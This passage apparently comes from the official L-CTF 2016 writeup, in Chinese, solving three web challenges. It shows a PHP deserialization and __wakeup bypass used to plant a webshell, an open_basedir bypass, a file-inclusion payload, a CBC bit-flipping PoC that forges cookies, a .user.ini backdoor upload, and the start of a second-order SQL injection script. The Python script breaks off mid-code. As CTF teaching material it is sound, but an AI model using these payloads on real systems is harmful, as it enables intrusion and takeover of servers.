title="t0137bab2f85f9d3a60.png" alt="http://p2.qhimg.com/t0137bab2f85f9d3a60.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Web 200 睡过了</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其实这个题就是前段时间爆出来的一个洞,如果你关注最新的漏洞这个题基本就是秒出啦~</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">具体的参见<a href="http://paper.seebug.org/39/" _src="http://paper.seebug.org/39/">http://paper.seebug.org/39/</a></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">，基本就是以下几点:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">1.PHP序列化字符串中对象长度前加一个+号仍可正常反序列化,可用此来绕过正则，参见<a href="http://www.phpbug.cn/archives/32.html" _src="http://www.phpbug.cn/archives/32.html">http://www.phpbug.cn/archives/32.html</a></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">2.PHP当序列化字符串中表示对象属性数的值大于真实的属性个数时会跳过__wakeup()的执行 (所以题目叫睡过啦~）；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">3.绕过PHP中open_basedir的限制。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先打开链接,在filename,filedata中填好一句话的文件名和文件内容,跳到了upload.php,有提示<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">"这种key加也行"</span>：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t014c1216eccdbd78e8.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t014c1216eccdbd78e8.png" title="t01c9ad01cbd34763a2.png" alt="http://p2.qhimg.com/t01c9ad01cbd34763a2.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">就像前面所说的加个<strong>+</strong>：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t011f2aa2220454c697.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t011f2aa2220454c697.png" title="t01aff385e9cf6d41be.png" alt="http://p3.qhimg.com/t01aff385e9cf6d41be.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">很明显filename和filedata的值被清空了。继续改掉"key"后面的那个2为3或者大于2这数字：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t010f424345b6c9c7e7.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t010f424345b6c9c7e7.png" title="t01f8dd2b1190d61053.png" alt="http://p3.qhimg.com/t01f8dd2b1190d61053.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">写进去了,嘿嘿嘿嘿~</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里实际上是会传到upload目录下,这个目录需要试一下或者扫,这个倒没什么,不过比较坑的一点是会把你的文件名做一下MD5在存在upload目录下 (这个确实.......不过我很快就放出提示告诉大家啦）。然后得知了路径直接用菜刀连上就有一个webshell啦：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01e00a2bcce152d94d.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01e00a2bcce152d94d.png" title="t01e4515006b9d5eecf.png" alt="http://p9.qhimg.com/t01e4515006b9d5eecf.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然而你会发现有open_basedir的限制,我们需要再写一个脚本去绕过：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019884dd279832b82b.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019884dd279832b82b.png" title="t01f021823817bf2bc7.png" alt="http://p8.qhimg.com/t01f021823817bf2bc7.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">参见P总的博客<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" _src="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后访问就可以得到Flag啦~~~~</span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">web_250–苏打学姐的网站</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这个题目一共有三个步骤。首先是文件读取，有一点小坑，当时放题想过要不要把后台正则匹配的代码提示出来，但是看到几个师傅秒过就算了，然后就是一个常规的CBC翻转，ctf也出现过。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后是一个上传，比较实战的一个点，使用.user.ini文件构成的PHP后门getshell。最有意思的就是尽量想办法防止文件被改或者删除等，毕竟要getshell，权限限制，再加上ph师傅说的-i隐藏属性各种限制，以及各位大佬的照顾和捧场，使最后题目没出乱子，谢谢大家。还是有一点失误的，记的有队伍的web牛直接使用php文件把flag读到网页访问，这样的话导致其他队伍去的话可以直接访问到flag了(感谢师傅马上上传覆盖解决这个尴尬)。so姿势水平还要加强。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先打开几个图片可以知道是文件包含，也给了tips提示<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">tips:file/tips.txt</span>、但是直接访问是403，使用img.php直接<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">img.php?id=file/tips.txt</span>也是读取不到的，必须是有jpg,还使用正则简单限制了<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">php://xxxxxxxxx/resource<strong>=</strong></span>形式的读取，后台代码如下：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ca964fc1fe9648fb.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ca964fc1fe9648fb.png" title="t01853cb5628e529c51.png" alt="http://p7.qhimg.com/t01853cb5628e529c51.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以payload： <span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">img.php?id=php://xxxxxxxxx/resource=file/1.jpg/resource=file/tips.txt</span>就可以读到。代码还给返回头加了<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">image/jpg</span>，火狐浏览器直接解析是看不到，可以使用Google Chrome或者curl命令也行。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01de0819c5bb594f0a.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01de0819c5bb594f0a.png" title="t01896e0d40d090f04f.png" alt="http://p8.qhimg.com/t01896e0d40d090f04f.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">得到后台，随便同方法看看admin.php.txt源码，知道是一个cbc翻转改变cookie，参考以前wooyun文章，各位可以网上搜索一下。打开<span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(255, 0, 0);">/admin_5080e75b2fe1fb62ff8d9d97db745120</span>首页，主要代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  php"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php plain">&lt;?php</code></div><div class="line number2 index1 alt1"><code class="php functions">error_reporting</code><code class="php plain">(0);</code></div><div class="line number3 index2 alt2"><code class="php variable">$Key</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php string">"xxxxxxxxxxxxxxxxx"</code><code class="php plain">;</code></div><div class="line number4 index3 alt1"><code class="php variable">$iv</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php string">"xxxxxxxxxxxxxxxx"</code><code class="php plain">;</code></div><div class="line number5 index4 alt2"><code class="php variable">$v</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php string">"2016niandiqijiequanguowangluoanquandasai0123456789abcdef--&gt;xdctfxdnum=2015auid=4;xdctfxdctf"</code><code class="php plain">;</code></div><div class="line number6 index5 alt1"><code class="php variable">$en_Result</code>&nbsp;<code class="php plain">=&nbsp;mcrypt_encrypt(MCRYPT_RIJNDAEL_128,</code><code class="php variable">$Key</code><code class="php plain">,&nbsp;</code><code class="php variable">$v</code><code class="php plain">,&nbsp;MCRYPT_MODE_CBC,&nbsp;</code><code class="php variable">$iv</code><code class="php plain">);</code></div><div class="line number7 index6 alt2"><code class="php variable">$enc</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php functions">base64_encode</code><code class="php plain">(</code><code class="php variable">$en_Result</code><code class="php plain">);</code></div><div class="line number8 index7 alt1"><code class="php variable">$en_Data</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php functions">base64_decode</code><code class="php plain">(</code><code class="php variable">$_COOKIE</code><code class="php plain">[user]);</code></div><div class="line number9 index8 alt2"><code class="php variable">$de_Result</code>&nbsp;<code class="php plain">=&nbsp;mcrypt_decrypt(MCRYPT_RIJNDAEL_128,</code><code class="php variable">$Key</code><code class="php plain">,&nbsp;</code><code class="php variable">$en_Data</code><code class="php plain">,&nbsp;MCRYPT_MODE_CBC,&nbsp;</code><code class="php variable">$iv</code><code class="php plain">);</code></div><div class="line number10 index9 alt1"><code class="php variable">$b</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php keyword">array</code><code class="php plain">();</code></div><div class="line number11 index10 alt2"><code class="php variable">$b</code>&nbsp;<code class="php plain">=&nbsp;isset(</code><code class="php variable">$_COOKIE</code><code class="php plain">[user])?</code><code class="php variable">$de_Result</code><code class="php plain">:</code><code class="php variable">$enc</code><code class="php plain">;</code></div><div class="line number12 index11 alt1"><code class="php variable">$num1</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php functions">substr</code><code class="php plain">(</code><code class="php variable">$b</code><code class="php plain">,</code><code class="php functions">strpos</code><code class="php plain">(</code><code class="php variable">$b</code><code class="php plain">,</code><code class="php string">"uid"</code><code class="php plain">)+4,1);</code></div><div class="line number13 index12 alt2"><code class="php variable">$num2</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php functions">substr</code><code class="php plain">(</code><code class="php variable">$b</code><code class="php plain">,</code><code class="php functions">strpos</code><code class="php plain">(</code><code class="php variable">$b</code><code class="php plain">,</code><code class="php string">"num"</code><code class="php plain">)+4,4);</code></div><div class="line number14 index13 alt1"><code class="php functions">echo</code>&nbsp;<code class="php string">'&lt;/br&gt;&lt;h3&gt;ID:&nbsp;'</code><code class="php plain">.</code><code class="php variable">$num1</code><code class="php plain">.</code><code class="php string">"&lt;/h3&gt;&lt;br&gt;"</code><code class="php plain">;</code></div><div class="line number15 index14 alt2"><code class="php keyword">if</code>&nbsp;<code class="php plain">(</code><code class="php variable">$num1</code>&nbsp;<code class="php plain">==&nbsp;1&nbsp;&nbsp;&amp;&amp;&nbsp;</code><code class="php variable">$num2</code>&nbsp;<code class="php plain">==&nbsp;2016){</code></div><div class="line number16 index15 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">die</code>&nbsp;<code class="php plain">(</code><code class="php string">"shen&nbsp;mi&nbsp;li&nbsp;wu&nbsp;!"</code><code class="php plain">);</code></div><div class="line number17 index16 alt2"><code class="php plain">}</code></div><div class="line number18 index17 alt1"><code class="php keyword">else</code><code class="php plain">{</code></div><div class="line number19 index18 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">echo</code>&nbsp;<code class="php string">"HELLO&nbsp;CLIENT"</code><code class="php plain">;</code></div><div class="line number20 index19 alt1"><code class="php plain">}</code></div><div class="line number21 index20 alt2"><code class="php plain">setcookie(</code><code class="php string">"user"</code><code class="php plain">,</code><code class="php variable">$enc</code><code class="php plain">);</code></div><div class="line number22 index21 alt1"><code class="php plain">?&gt;</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">需要改变的是2015的5和uid=4的4,分别对应63和57位，poc：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  php"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php plain">&lt;?php&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code></div><div class="line number2 index1 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$enc</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php string">"dSaWGkNVh2MADjPscqdId/25Y68VaL+Ze6rYSCUHvvDV7MnbDs6fHcibGemmyMoyfHa9cXJ7DHU8Wd/DZqyNfLQ5dDs9wVDIllMKnIQilJunP9hpJ3CYFayOF0vbiqhM"</code><code class="php plain">;</code></div><div class="line number3 index2 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$enc</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php functions">base64_decode</code><code class="php plain">(</code><code class="php variable">$enc</code><code class="php plain">);</code></div><div class="line number4 index3 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$enc</code><code class="php plain">[63]&nbsp;=&nbsp;</code><code class="php functions">chr</code><code class="php plain">(ord(</code><code class="php variable">$enc</code><code class="php plain">[63])&nbsp;^&nbsp;ord(</code><code class="php string">"4"</code><code class="php plain">)&nbsp;^&nbsp;ord&nbsp;(</code><code class="php string">"1"</code><code class="php plain">));</code></div><div class="line number5 index4 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$enc</code><code class="php plain">[57]&nbsp;=&nbsp;</code><code class="php functions">chr</code><code class="php plain">(ord(</code><code class="php variable">$enc</code><code class="php plain">[57])&nbsp;^&nbsp;ord(</code><code class="php string">"5"</code><code class="php plain">)&nbsp;^&nbsp;ord&nbsp;(</code><code class="php string">"6"</code><code class="php plain">));</code></div><div class="line number6 index5 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$c</code>&nbsp;<code class="php plain">=&nbsp;</code><code class="php functions">base64_encode</code><code class="php plain">(</code><code class="php variable">$enc</code><code class="php plain">);</code></div><div class="line number7 index6 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$d</code>&nbsp;<code class="php plain">=&nbsp;urlencode(</code><code class="php variable">$c</code><code class="php plain">);</code></div><div class="line number8 index7 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">echo</code>&nbsp;<code class="php variable">$d</code><code class="php plain">;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code></div><div class="line number9 index8 alt2"><code class="php plain">?&gt;</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">替换cookie可以跳转到上传界面，fuzzing可以上传ini，不多说直接一篇文章搞定：<a href="http://404.so/7945.html" _src="http://404.so/7945.html">http://404.so/7945.html</a>，之后getshell。得到flag。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01f30cd610bc096230.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01f30cd610bc096230.png" title="t01066639696ea98e47.png" alt="http://p9.qhimg.com/t01066639696ea98e47.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Web 300 headpic</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这道题的大致思路是，首先通过注册账户，注册带非法字符的用户名，发现无法正常的修改头像，而构造正确的sql逻辑则可以更新头像，于是认为在访问用户主页时触发了二次注入。然后到需要写脚本的时候，需要克服这道题的验证码。首先它形式很简单，完全没有粘连，因此可以直接用tesseract-ocr识别；不过还有更简单的方式，验证码是存在session里的，且缺乏验证，那我们直接清空cookie，验证码就不起效了。注入的脚本大致如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#coding:utf-8</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code>&nbsp;<code class="python plain">requests</code></div><div class="line number3 index2 alt2"><code class="python keyword">import</code>&nbsp;<code class="python plain">random</code></div><div class="line number4 index3 alt1"><code class="python keyword">import</code>&nbsp;<code class="python plain">pytesseract&nbsp;&nbsp;</code></div><div class="line number5 index4 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">PIL&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">Image</code></div><div class="line number6 index5 alt1"><code class="python keyword">from</code>&nbsp;<code class="python plain">io&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">BytesIO</code></div><div class="line number7 index6 alt2"><code class="python keyword">import</code>&nbsp;<code class="python plain">string</code></div><div class="line number8 index7 alt1"><code class="python keyword">import</code>&nbsp;<code class="python plain">sys</code></div><div class="line number9 index8 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">regist(name):</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">url1</code><code class="python keyword">=</code><code class="python plain">url</code><code class="python keyword">+</code><code class="python string">"check.php"</code></div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">try</code><code class="python plain">:</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code>&nbsp;<code class="python plain">i&nbsp;</code><code class="python keyword">in</code>&nbsp;<code class="python functions">range</code><code class="python plain">(</code><code class="python value">20</code><code class="python plain">):</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">veri&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">verify()</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;veri</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload</code><code class="python keyword">=</code><code class="python plain">{</code><code class="python string">'user'</code><code class="python plain">:name,</code><code class="python string">'pass'</code><code class="python plain">:</code><code class="python string">'111'</code><code class="python plain">,</code><code class="python string">'verify'</code><code class="python plain">:veri,</code><code class="python string">'typer'</code><code class="python plain">:</code><code class="python string">'0'</code><code class="python plain">,</code><code class="python string">'register'</code><code class="python plain">:</code><code class="python string">"%E6%B3%A8%E5%86%8C"</code><code class="python plain">}</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;payload</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">r</code><code class="python keyword">=</code><code class="python plain">requests.post(url1,data</code><code class="python keyword">=</code><code class="python plain">payload,headers</code><code class="python keyword">=</code><code class="python plain">headers)</code></div><div class="line number18 index17 